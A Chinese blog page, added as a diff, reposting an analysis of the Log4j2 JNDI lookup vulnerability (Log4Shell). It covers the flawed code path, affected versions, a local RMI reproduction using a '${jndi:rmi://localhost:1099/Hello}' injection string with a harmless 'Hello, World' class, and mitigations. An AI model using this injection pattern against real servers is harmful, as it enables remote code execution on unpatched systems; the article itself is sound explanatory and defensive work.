@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>深入分析Log4j 漏洞 | Jenna233</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="[转]深入分析Log4j 漏洞 几乎每个系统都会使用日志框架，用于记录日志信息，这些信息可以提供程序运行的上下文，但是日志过多也会影响系统的性能，所以好的日志框架应该是可靠，快速和可扩展的。Apache Log4j2 是一个基于 Java 的日志工具，是Log4j的升级版本，引入了很多丰富的特性，包括高性能，低垃圾收集，插件系统等。目前很多互联网公司以及耳熟能详的公司的系统或者开源框架都在使用Lo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入分析Log4j 漏洞">
+<meta property="og:url" content="https://jenna233.github.io/2022/05/03/%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90Log4j-%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Jenna233">
+<meta property="og:description" content="[转]深入分析Log4j 漏洞 几乎每个系统都会使用日志框架，用于记录日志信息，这些信息可以提供程序运行的上下文，但是日志过多也会影响系统的性能，所以好的日志框架应该是可靠，快速和可扩展的。Apache Log4j2 是一个基于 Java 的日志工具，是Log4j的升级版本，引入了很多丰富的特性，包括高性能，低垃圾收集，插件系统等。目前很多互联网公司以及耳熟能详的公司的系统或者开源框架都在使用Lo">
+<meta property="og:locale">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15531792-2639f6212e70d3d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15531792-9698512c59b60595.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15531792-bb9eac64db411298.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15531792-3df7921b424b5d42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="article:published_time" content="2022-05-03T04:06:31.000Z">
+<meta property="article:modified_time" content="2022-05-03T04:06:57.475Z">
+<meta property="article:author" content="Jenna233">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/15531792-2639f6212e70d3d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+  
+    <link rel="alternate" href="/atom.xml" title="Jenna233" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/tocas.css">
+
+  
+<link rel="stylesheet" href="/css/animate.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <style type="text/css">
+    a.title-link:hover{
+        color: #34b2db !important;
+    }
+
+    a.title-link:active{
+        color: #2075c1 !important;
+    }
+
+    #menu-color-id{
+        background : #f7f7f7;
+    }
+
+    #menu-color-id a{
+        color: #5a5a5a;
+    }
+  </style>
+  
+<script src="/js/tocas.js"></script>
+
+  
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+<!-- navigation -->
+
+<div class="ts fluid basic link big menu" id="menu-color-id">
+
+    <!-- ejs : align to post page or index page -->
+        
+            <div class="ts very narrow container">
+        
+
+        
+            <a class="item" href="/">Home</a>
+        
+            <a class="item" href="/archives">Archives</a>
+        
+    </div>
+</div>
+<!-- the end of navigation -->
+
+<!-- big bang title -->
+<div class="ts padded horizontally fitted fluid slate" style="background-color: #f7f7f7;">
+    <!-- ejs : align to post page or index page -->
+    
+        <div class="ts very narrow container">
+    
+        <!-- Title -->
+        <h1 class="ts eleven wide column header be-center-h1">
+            <span style="color: #404040;" id="big-title">Jenna233</span>
+            <div class="sub header" id="slogan-bar" style=" margin-top: 15px; color: #404040;"></div>
+        </h1>
+        <!-- the end of title -->
+    </div>
+</div>
+<!-- the end of big bang title -->
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+
+<!-- main section -->
+<div class="ts text container">
+        <!-- left section -->
+        <div class="column" style=" padding: 35px; ">
+            <!-- Articles -->
+                
+                <h1 class="ts header">
+                    <span style="color: #333;">深入分析Log4j 漏洞</span>
+                    <div class="sub header" style="color: #808080;">Publish: 2022/5/3 
+                     &nbsp;&nbsp;
+                        <ul class="unstyled radius-tag -list" itemprop="keywords"><li class="unstyled radius-tag -list-item"><a class="unstyled radius-tag -list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+                    
+                    </div>
+                </h1>
+
+                <p>[转]<a target="_blank" rel="noopener" href="https://juejin.cn/post/7042310323151306759">深入分析Log4j 漏洞</a><br><img src="https://upload-images.jianshu.io/upload_images/15531792-2639f6212e70d3d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>几乎每个系统都会使用日志框架，用于记录日志信息，这些信息可以提供程序运行的上下文，但是日志过多也会影响系统的性能，所以好的日志框架应该是可靠，快速和可扩展的。<br>Apache Log4j2 是一个基于 Java 的日志工具，是Log4j的升级版本，引入了很多丰富的特性，包括高性能，低垃圾收集，插件系统等。目前很多互联网公司以及耳熟能详的公司的系统或者开源框架都在使用Log4j2。<br>2021.12.7，Log4j首次被发现了一个非常严重的漏洞，在当天Log4j就发布了log4j-2.15.0-rc1，但是12.9那天被发现这个版本仍然可以触发漏洞。简单点说，黑客可以恶意构造特殊数据请求包payload触发漏洞，从而可以在目标服务器上执行任意代码，导致服务器被黑客控制，被定性为“过去十年来最大、最关键的漏洞”。<br>根据目前统计，90%以上基于java开发的应用平台都会受到影响。那么这篇文章就会深入分析这个漏洞究竟是怎么产生的以及怎么修复它。</p>
+<h1 id="1-Log4j简介"><a href="#1-Log4j简介" class="headerlink" title="1. Log4j简介"></a>1. Log4j简介</h1><p>Apache Log4j 是一个基于<a href="https://link.juejin.cn/?target=https://zh.wikipedia.org/wiki/Java" title="https://zh.wikipedia.org/wiki/Java">Java</a>的日志记录工具。它是由Ceki Gülcü首创的，现在已经发展为<a href="https://link.juejin.cn/?target=https://zh.wikipedia.org/wiki/Apache%25E8%25BD%25AF%25E4%25BB%25B6%25E5%259F%25BA%25E9%2587%2591%25E4%25BC%259A" title="https://zh.wikipedia.org/wiki/Apache%E8%BD%AF%E4%BB%B6%E5%9F%BA%E9%87%91%E4%BC%9A">Apache软件基金会</a>的项目之一。</p>
+<p>经过多年的开发迭代，Log4j 1.x的维护已经变得非常困难，因为它需要与非常旧的 Java 版本兼容，所以于 2015 年 8 月正式升级为Log4j2。</p>
+<h1 id="2-Log4j的lookup功能"><a href="#2-Log4j的lookup功能" class="headerlink" title="2. Log4j的lookup功能"></a>2. Log4j的lookup功能</h1><p>本次漏洞是因为Log4j2组件中 lookup功能的实现类 JndiLookup 的设计缺陷导致，这个类存在于log4j-core-xxx.jar中。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-9698512c59b60595.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="安全漏洞的类"><br>log4j的<a href="https://link.juejin.cn/?target=https://logging.apache.org/log4j/2.x/manual/lookups.html" title="https://logging.apache.org/log4j/2.x/manual/lookups.html">Lookups</a>功能可以快速打印包括运行应用容器的docker属性，环境变量，日志事件，Java应用程序环境信息等内容。比如我们打印Java运行时版本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class VulnerabilityTest &#123;</span><br><span class="line">    private static final Logger LOGGER &#x3D; LogManager.getLogger();</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        LOGGER.error(&quot;Test:&#123;&#125;&quot;,&quot;$&#123;java:runtime&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">20:20:21.312 [main] ERROR com.ldbmcs.VulnerabilityTest - OpenJDK Runtime Environment (build 11.0.11+9) from AdoptOpenJDK</span><br></pre></td></tr></table></figure>
+<p>那么<code>JndiLookup</code>到底有什么设计缺陷导致出现的史诗级漏洞呢？</p>
+<p>我们首先把目标放在<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</code>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public void format(final LogEvent event, final StringBuilder toAppendTo) &#123;</span><br><span class="line">        Message msg &#x3D; event.getMessage();</span><br><span class="line">        if (msg instanceof StringBuilderFormattable) &#123;</span><br><span class="line">            boolean doRender &#x3D; this.textRenderer !&#x3D; null;</span><br><span class="line">            StringBuilder workingBuilder &#x3D; doRender ? new StringBuilder(80) : toAppendTo;</span><br><span class="line">            int offset &#x3D; workingBuilder.length();</span><br><span class="line">            if (msg instanceof MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">                ((MultiFormatStringBuilderFormattable)msg).formatTo(this.formats, workingBuilder);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (this.config !&#x3D; null &amp;&amp; !this.noLookups) &#123;</span><br><span class="line">                for(int i &#x3D; offset; i &lt; workingBuilder.length() - 1; ++i) &#123;</span><br><span class="line">                    if (workingBuilder.charAt(i) &#x3D;&#x3D; &#39;$&#39; &amp;&amp; workingBuilder.charAt(i + 1) &#x3D;&#x3D; &#39;&#123;&#39;) &#123;</span><br><span class="line">                        String value &#x3D; workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                        workingBuilder.setLength(offset);</span><br><span class="line">                        workingBuilder.append(this.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">       ...</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">      ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们传入的message会通过<code>MessagePatternConverter.format()</code>，判断如果<code>config</code>存在并且<code>noLookups</code>为false（默认为false），然后匹配到<code>$&#123;</code>则通过<code>getStrSubstitutor()</code>替换原有的字符串，比如这里的<code>$&#123;java:runtime&#125;</code>。<br>因为这里没有任何的白名单，那么我们就可以构造任何的字符串，只有符合<code>$&#123;</code>就可以。<br>继续往下走，来到<code>org.apache.logging.log4j.core.lookup.Interpolator#lookup</code><br><img src="https://upload-images.jianshu.io/upload_images/15531792-bb9eac64db411298.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="lookup 函数"><br>我们可以看到处理<code>event</code>的时候根据前缀选择对应的<code>StrLookup</code>进行处理，目前支持date，jndi，java，main等多种类型，如果构造的event是jndi，则通过JndiLoopup进行处理，从而构造漏洞。</p>
+<h1 id="3-Log4j-漏洞"><a href="#3-Log4j-漏洞" class="headerlink" title="3. Log4j 漏洞"></a>3. Log4j 漏洞</h1><p>受影响的版本：</p>
+<p>2.0-beta9 &lt;= Apache Log4j &lt;= 2.15.0-rc1</p>
+<blockquote>
+<p>Log4j 1.x不受此漏洞影响。</p>
+</blockquote>
+<p>受影响的框架或者组件：</p>
+<ul>
+<li>Spring-boot-strater-log4j2</li>
+<li>Apache Solr</li>
+<li>Apache Flink</li>
+<li>Apache Druid</li>
+</ul>
+<h1 id="4-Log4j-漏洞复现"><a href="#4-Log4j-漏洞复现" class="headerlink" title="4. Log4j 漏洞复现"></a>4. Log4j 漏洞复现</h1><p>我们以<a href="https://link.juejin.cn/?target=https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/hello/hello-world.html" title="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/hello/hello-world.html">RMI</a>服务为例复现Log4j的漏洞，RMI是远程方法调用(Remote Method Invocation)，能够让A电脑的java虚拟机上的对象调用B电脑的java 虚拟机中的对象上的方法。但是客户端并不是直接调用服务器上的方法的，而是会借助<strong>存根 (stub)</strong> 充当我们客户端的代理，来访问服务端，同时<strong>骨架 (Skeleton)</strong> 是另一个代理，它与真实对象一起在服务端上，骨架将接受到的请求交给服务器来处理，服务器处理完成之后将结果进行打包发送至存根 ，然后存根将结果进行解包之后的结果发送给客户端。</p>
+<p>RMI包括三个部分：</p>
+<ul>
+<li>Registry：提供服务注册与服务获取。即Server端向Registry注册服务，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</li>
+<li>Server： 远程方法的提供者，并向Registry注册自身提供的服务。</li>
+<li>Client:：远程方法的消费者，从Registry获取远程方法的相关信息并且调用。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-3df7921b424b5d42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="流程图"><br>OKveDJ</li>
+</ul>
+<p>创建<code>Server</code>类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class RMIServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry &#x3D; LocateRegistry.createRegistry(1099);</span><br><span class="line">            ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(new Reference(&quot;com.ldbmcs.rmi.RmiExecute&quot;, &quot;com.ldbmcs.rmi.RmiExecute&quot;, null));</span><br><span class="line">            registry.bind(&quot;Hello&quot;, referenceWrapper);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            System.out.println(&quot;Server Exception: &quot; + e);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>创建对象：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class RmiExecute &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        System.out.println(&quot;Hello, World&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>接着，我们在测试类<code>VulnerabilityTest</code>中修改代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class VulnerabilityTest &#123;</span><br><span class="line">    private static final Logger LOGGER &#x3D; LogManager.getLogger();</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String test &#x3D; &quot;$&#123;jndi:rmi:&#x2F;&#x2F;localhost:1099&#x2F;Hello&#125;&quot;;</span><br><span class="line">        LOGGER.error(&quot;Test:&#123;&#125;&quot;, test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>分别启动<code>RMIServer</code>和<code>VulnerabilityTest</code>，我们可以看到在<code>VulnerabilityTest</code>中打印出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, World</span><br></pre></td></tr></table></figure>
+<p>也就是说，我们可以在目标服务器中执行任意代码，影响不言而喻。</p>
+<p>那么怎么解决呢？</p>
+<h1 id="5-Log4j-漏洞修复"><a href="#5-Log4j-漏洞修复" class="headerlink" title="5. Log4j 漏洞修复"></a>5. Log4j 漏洞修复</h1><ol>
+<li><p>设置jvm参数：<code>-Dlog4j2.formatMsgNoLookups=true</code></p>
+</li>
+<li><p>设置系统环境变量：<code>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true</code></p>
+</li>
+<li><p>升级版本：<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/download.html">官方</a>，最新的版本仅支持java, ldap, 和 ldaps，同时默认禁用JNDI等等功能去限制利用构造payload去触发漏洞。</p>
+<ul>
+<li>Java 8及之后的版本升级到 v2.16.0。(后续还有2.17版本)</li>
+<li>Java 7 升级到 v2.12.2。</li>
+<li>其他版本，删除<code>JndiLookup</code>类：<code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></li>
+</ul>
+</li>
+</ol>
+
+            <!-- / the end of articles -->
+        </div>
+        <!-- / left section -->
+        
+        
+            <hr/>
+            <div id="disqus_thread" style=" margin-top: 15px; margin-bottom: 25px; "></div>
+            <script>
+                /**
+                *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+                *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+                /*
+                var disqus_config = function () {
+                this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+                this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                };
+                */
+                (function() { // DON'T EDIT BELOW THIS LINE
+                var d = document, s = d.createElement('script');
+                s.src = 'https://morgan-hexo-theme.disqus.com/embed.js';
+                s.setAttribute('data-timestamp', +new Date());
+                (d.head || d.body).appendChild(s);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        
+
+        <!-- Next Post and Prev Post -->
+        
+        <hr/>
+        <div class="next-prev-post-section">
+            
+                <a href="/2022/05/03/webpack-%E4%B8%AD%EF%BC%8Chash%E3%80%81chunkhash%E3%80%81contenthash-%E7%9A%84%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/" class="styled-border">
+                    ←
+                    webpack 中，hash、chunkhash、contenthash 的区别是什么？
+                    
+                </a>
+            
+            
+                <a href="/2022/05/03/%E4%BB%80%E4%B9%88%E6%98%AFCVE%EF%BC%9F/" class="styled-border">
+                    
+                    什么是CVE？
+                    →
+                </a>
+            
+        </div>
+        
+</div>
+<script type="text/javascript">
+    let img = document.getElementsByTagName("img");
+    for(let i = 0; i < img.length; i++){
+        img[i].className += " ts fluid image";
+    }
+</script>
+<!-- / main section -->
+
+<!-- copyright -->
+<div class="ts attached secondary segment">
+    <div class="ts narrow container">
+        <br>
+        <div class="ts large center aligned header">
+            Powered by Hexo, Theme designs by @hpcslag.
+            <div class="smaller sub header">
+                Style-Framework Tocas-UI designs by @yamioldmel 
+            </div>
+        </div>
+        <br>
+    </div>
+</div>
+<!-- / copyright -->
+<script type="text/javascript">
+    
+    const slogans = ["Hallo, dit is mijn blog","嗨，這是我的博客!","안녕하세요, 제 블로그입니다.","Hi, This is my blog!","こんにちは、私のブログへようこそ!","مرحبا، مرحبا بك في مدونتي"];
+</script>
+
+<script src="/js/script.js"></script>
+
+</body>
+</html>
